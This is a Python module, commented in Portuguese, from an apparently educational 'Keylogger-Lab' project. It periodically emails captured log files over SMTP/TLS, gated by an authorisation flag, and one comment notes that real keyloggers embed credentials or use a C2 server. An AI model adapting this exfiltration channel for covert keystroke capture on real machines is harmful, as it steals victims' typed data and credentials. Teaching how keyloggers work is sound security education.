"""
Módulo de Envio de E-mail — Keylogger-Lab
=========================================

Implementa o envio automatizado de relatórios por e-mail via SMTP/TLS.

NOTA: Este arquivo é nomeado 'email_sender.py' (e não 'email.py') para
evitar conflito com o módulo 'email' da biblioteca padrão do Python.

Conceitos demonstrados:
    - Conexão SMTP com STARTTLS (porta 587)
    - Construção de mensagens MIME multipart
    - Anexo de arquivos binários
    - Autenticação com servidor de e-mail
    - Histórico e auditoria de envios
    - Requisito de autorização prévia

Como funciona a transmissão SMTP:
    1. Cliente conecta ao servidor SMTP (ex: smtp.gmail.com:587)
    2. EHLO — apresentação do cliente ao servidor
    3. STARTTLS — upgrade da conexão para TLS criptografado
    4. LOGIN — autenticação com credenciais
    5. MAIL FROM — define remetente
    6. RCPT TO — define destinatário
    7. DATA — envia conteúdo da mensagem (cabeçalhos + corpo + anexos)
    8. QUIT — encerra conexão

Segurança:
    - Senhas NÃO são salvas em disco (apenas em memória durante a sessão)
    - TLS obrigatório para proteger credenciais em trânsito
    - Envio requer autorização explícita do usuário
"""

import smtplib
import os
import datetime
import json
import logging
import threading
from typing import List, Tuple, Optional
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


class GerenciadorEmail:
    """
    Gerencia o envio de relatórios do laboratório por e-mail.

    Requer autorização explícita antes de permitir qualquer envio.
    Mantém um histórico completo de todas as tentativas de envio.

    Attributes:
        autorizado (bool): Se True, o envio está autorizado pelo usuário.
        historico (list): Lista de registros de envios realizados.
    """

    def __init__(self, config_path: str = "config_email.json"):
        """
        Inicializa o gerenciador de e-mail.

        Args:
            config_path: Caminho para o arquivo de configuração JSON.
                        A senha NÃO é persistida neste arquivo.
        """
        self.config_path = config_path
        self.config: dict = self._carregar_config()
        self.historico: List[dict] = []
        self.autorizado: bool = False
        self._senha_memoria: str = ""  # Senha mantida apenas em memória
        self._timer_envio: Optional[threading.Timer] = None
        self._envio_automatico_ativo: bool = False
        self.logger = logging.getLogger("email_sender")

    def _carregar_config(self) -> dict:
        """
        Carrega a configuração de e-mail do disco.

        A senha nunca é persistida no arquivo de configuração.

        Returns:
            dict: Configuração de e-mail.
        """
        config_padrao = {
            "servidor_smtp": "smtp.gmail.com",
            "porta": 587,
            "email_remetente": "",
            "email_destinatario": "",
            "intervalo_minutos": 60,
            "tls": True,
            "assunto_padrao": "Relatório Keylogger-Lab",
        }

        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    config_salva = json.load(f)
                config_padrao.update(config_salva)
            except (json.JSONDecodeError, IOError) as e:
                logging.getLogger("email_sender").warning(
                    f"Erro ao carregar config de e-mail: {e}"
                )

        return config_padrao

    def _salvar_config(self):
        """
        Salva a configuração de e-mail em disco (sem a senha).

        IMPORTANTE: A senha é deliberadamente excluída do arquivo
        de configuração para evitar vazamento de credenciais.
        Em um keylogger real, as credenciais seriam embutidas no
        binário ou obtidas de um servidor C2 (Command & Control).
        """
        config_salvar = {k: v for k, v in self.config.items() if k != "senha"}
        try:
            with open(self.config_path, "w", encoding="utf-8") as f:
                json.dump(config_salvar, f, indent=2, ensure_ascii=False)
            self.logger.debug("Configuração de e-mail salva (sem senha)")
        except IOError as e:
            self.logger.error(f"Erro ao salvar configuração de e-mail: {e}")

    def configurar(
        self,
        servidor: str,
        porta: int,
        remetente: str,
        senha: str,
        destinatario: str,
        intervalo: int = 60,
    ):
        """
        Define a configuração de e-mail.

        Args:
            servidor: Endereço do servidor SMTP (ex: smtp.gmail.com).
            porta: Porta SMTP (587 para STARTTLS, 465 para SSL).
            remetente: E-mail do remetente.
            senha: Senha ou App Password do remetente.
            destinatario: E-mail do destinatário autorizado.
            intervalo: Intervalo em minutos para envio automático.
        """
        self.config.update(
            {
                "servidor_smtp": servidor,
                "porta": porta,
                "email_remetente": remetente,
                "email_destinatario": destinatario,
                "intervalo_minutos": intervalo,
                "tls": True,
            }
        )
        self._senha_memoria = senha
        self._salvar_config()
        self.logger.info(
            f"E-mail configurado: {remetente} -> {destinatario} via {servidor}:{porta}"
        )

    def definir_senha(self, senha: str):
        """
        Define a senha em memória (não salva em disco).

        Args:
            senha: Senha ou App Password do e-mail.
        """
        self._senha_memoria = senha
        self.logger.debug("Senha definida em memória")

    def autorizar_envio(self):
        """
        Autoriza o envio de e-mails.

        Sem autorização, todas as tentativas de envio serão bloqueadas.
        Isso garante que o usuário tenha controle total sobre a transmissão.
        """
        self.autorizado = True
        self.logger.info("✅ Envio de e-mails autorizado pelo usuário")

    def revogar_autorizacao(self):
        """Revoga a autorização de envio e para envios automáticos."""
        self.autorizado = False
        self.parar_envio_automatico()
        self.logger.info("❌ Autorização de envio revogada")

    def validar_configuracao(self) -> Tuple[bool, str]:
        """
        Valida se a configuração de e-mail está completa.

        Returns:
            tuple: (válido: bool, mensagem: str)
        """
        if not self.config.get("email_remetente"):
            return False, "E-mail do remetente não configurado"
        if not self.config.get("email_destinatario"):
            return False, "E-mail do destinatário não configurado"
        if not self._senha_memoria:
            return False, "Senha não definida"
        if not self.config.get("servidor_smtp"):
            return False, "Servidor SMTP não configurado"
        return True, "Configuração válida"

    def _construir_mensagem(
        self, arquivos_anexo: List[str], assunto: Optional[str] = None
    ) -> MIMEMultipart:
        """
        Constrói uma mensagem MIME com anexos.

        Estrutura da mensagem MIME:
        ├── Cabeçalhos (From, To, Subject, Date)
        ├── Corpo (text/plain)
        └── Anexos (application/octet-stream, codificados em base64)

        Args:
            arquivos_anexo: Lista de caminhos dos arquivos a anexar.
            assunto: Assunto do e-mail (usa padrão se não informado).

        Returns:
            MIMEMultipart: Mensagem construída pronta para envio.
        """
        msg = MIMEMultipart()
        msg["From"] = self.config["email_remetente"]
        msg["To"] = self.config["email_destinatario"]
        msg["Subject"] = assunto or self.config.get(
            "assunto_padrao", "Relatório Keylogger-Lab"
        )
        msg["Date"] = datetime.datetime.now().strftime("%a, %d %b %Y %H:%M:%S %z")

        # Corpo da mensagem
        corpo = (
            f"{'=' * 50}\n"
            f"  KEYLOGGER-LAB — Relatório Automático\n"
            f"{'=' * 50}\n\n"
            f"  Data de envio : {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"  Remetente     : {self.config['email_remetente']}\n"
            f"  Destinatário  : {self.config['email_destinatario']}\n"
            f"  Arquivos      : {len(arquivos_anexo)}\n\n"
            f"  Este é um envio automático do Laboratório Educacional\n"
            f"  de Cibersegurança. Uso exclusivamente educacional.\n\n"
            f"{'=' * 50}\n"
        )
        msg.attach(MIMEText(corpo, "plain", "utf-8"))

        # Anexar arquivos
        for caminho in arquivos_anexo:
            if not os.path.exists(caminho):
                self.logger.warning(f"Arquivo não encontrado para anexo: {caminho}")
                continue

            try:
                with open(caminho, "rb") as f:
                    parte = MIMEBase("application", "octet-stream")
                    parte.set_payload(f.read())
                encoders.encode_base64(parte)
                nome_arquivo = os.path.basename(caminho)
                parte.add_header(
                    "Content-Disposition", f"attachment; filename={nome_arquivo}"
                )
                msg.attach(parte)
                self.logger.debug(f"Arquivo anexado: {nome_arquivo}")
            except IOError as e:
                self.logger.error(f"Erro ao anexar arquivo {caminho}: {e}")

        return msg

    def enviar_relatorio(
        self, arquivos_anexo: List[str], assunto: Optional[str] = None
    ) -> Tuple[bool, str]:
        """
        Envia um relatório com os arquivos de log anexados.

        Fluxo da transmissão SMTP:
        1. Verificar autorização
        2. Validar configuração
        3. Conectar ao servidor SMTP
        4. Iniciar STARTTLS (criptografia)
        5. Autenticar
        6. Enviar mensagem
        7. Registrar no histórico

        Args:
            arquivos_anexo: Lista de caminhos dos arquivos a enviar.
            assunto: Assunto personalizado (opcional).

        Returns:
            tuple: (sucesso: bool, mensagem: str)

        Raises:
            PermissionError: Se o envio não estiver autorizado.
            ValueError: Se a configuração estiver incompleta.
        """
        # Verificar autorização
        if not self.autorizado:
            msg = "Envio não autorizado. Autorize antes de enviar."
            self.logger.warning(msg)
            raise PermissionError(msg)

        # Validar configuração
        valido, mensagem = self.validar_configuracao()
        if not valido:
            self.logger.error(f"Configuração inválida: {mensagem}")
            raise ValueError(mensagem)

        # Filtrar apenas arquivos existentes
        arquivos_validos = [a for a in arquivos_anexo if os.path.exists(a)]
        if not arquivos_validos:
            return False, "Nenhum arquivo válido para enviar"

        # Construir mensagem
        msg = self._construir_mensagem(arquivos_validos, assunto)

        # Enviar via SMTP
        try:
            self.logger.info(
                f"Conectando a {self.config['servidor_smtp']}:{self.config['porta']}..."
            )

            with smtplib.SMTP(
                self.config["servidor_smtp"], self.config["porta"], timeout=30
            ) as servidor:
                servidor.ehlo()

                if self.config.get("tls", True):
                    servidor.starttls()
                    servidor.ehlo()
                    self.logger.debug("Conexão TLS estabelecida")

                servidor.login(self.config["email_remetente"], self._senha_memoria)
                self.logger.debug("Autenticação SMTP bem-sucedida")

                servidor.send_message(msg)

            # Registrar sucesso no histórico
            registro = self._criar_registro_historico(
                arquivos_validos, "ENVIADO", "Enviado com sucesso"
            )
            self.historico.append(registro)
            self.logger.info(
                f"✅ Relatório enviado para {self.config['email_destinatario']} "
                f"({len(arquivos_validos)} arquivo(s))"
            )
            return True, "Relatório enviado com sucesso"

        except smtplib.SMTPAuthenticationError:
            erro = "Falha na autenticação. Verifique e-mail e senha (use App Password para Gmail)."
            self._registrar_erro(arquivos_validos, erro)
            return False, erro

        except smtplib.SMTPConnectError:
            erro = f"Não foi possível conectar a {self.config['servidor_smtp']}:{self.config['porta']}"
            self._registrar_erro(arquivos_validos, erro)
            return False, erro

        except smtplib.SMTPException as e:
            erro = f"Erro SMTP: {str(e)}"
            self._registrar_erro(arquivos_validos, erro)
            return False, erro

        except Exception as e:
            erro = f"Erro inesperado: {str(e)}"
            self._registrar_erro(arquivos_validos, erro)
            return False, erro

    def _criar_registro_historico(
        self, arquivos: List[str], status: str, mensagem: str
    ) -> dict:
        """Cria um registro para o histórico de envios."""
        return {
            "data": datetime.datetime.now().isoformat(),
            "destinatario": self.config["email_destinatario"],
            "arquivos": [os.path.basename(a) for a in arquivos],
            "status": status,
            "mensagem": mensagem,
        }

    def _registrar_erro(self, arquivos: List[str], erro: str):
        """Registra um erro no histórico e no log."""
        registro = self._criar_registro_historico(arquivos, "ERRO", erro)
        self.historico.append(registro)
        self.logger.error(f"❌ Falha no envio: {erro}")

    def iniciar_envio_automatico(self, diretorio_logs: str = "logs"):
        """
        Inicia o envio automático periódico dos logs.

        Args:
            diretorio_logs: Diretório contendo os arquivos de log.
        """
        if not self.autorizado:
            raise PermissionError("Envio automático requer autorização prévia")

        self._envio_automatico_ativo = True
        self._agendar_proximo_envio(diretorio_logs)
        self.logger.info(
            f"Envio automático iniciado — intervalo: {self.config['intervalo_minutos']} min"
        )

    def _agendar_proximo_envio(self, diretorio_logs: str):
        """Agenda o próximo envio automático."""
        if not self._envio_automatico_ativo:
            return

        intervalo_segundos = self.config.get("intervalo_minutos", 60) * 60

        def _executar_envio():
            if not self._envio_automatico_ativo:
                return
            try:
                arquivos = [
                    os.path.join(diretorio_logs, f)
                    for f in os.listdir(diretorio_logs)
                    if f.endswith(".txt")
                ]
                if arquivos:
                    self.enviar_relatorio(arquivos)
            except Exception as e:
                self.logger.error(f"Erro no envio automático: {e}")
            finally:
                self._agendar_proximo_envio(diretorio_logs)

        self._timer_envio = threading.Timer(intervalo_segundos, _executar_envio)
        self._timer_envio.daemon = True
        self._timer_envio.start()

    def parar_envio_automatico(self):
        """Para o envio automático."""
        self._envio_automatico_ativo = False
        if self._timer_envio:
            self._timer_envio.cancel()
            self._timer_envio = None
        self.logger.info("Envio automático parado")

    def obter_historico(self) -> List[dict]:
        """
        Retorna o histórico completo de envios.

        Returns:
            list: Lista de registros de envio com data, status e detalhes.
        """
        return self.historico.copy()

    def formatar_historico(self) -> str:
        """
        Formata o histórico de envios para exibição.

        Returns:
            str: Histórico formatado em texto.
        """
        if not self.historico:
            return "Nenhum envio registrado."

        linhas = [
            "=" * 60,
            "  HISTÓRICO DE ENVIOS — KEYLOGGER-LAB",
            "=" * 60,
        ]

        for i, reg in enumerate(self.historico, 1):
            status_icon = "✅" if reg["status"] == "ENVIADO" else "❌"
            linhas.extend(
                [
                    f"\n  [{i}] {status_icon} {reg['status']}",
                    f"      Data        : {reg['data']}",
                    f"      Destinatário: {reg['destinatario']}",
                    f"      Arquivos    : {', '.join(reg['arquivos'])}",
                    f"      Mensagem    : {reg['mensagem']}",
                ]
            )

        linhas.append("\n" + "=" * 60)
        return "\n".join(linhas)
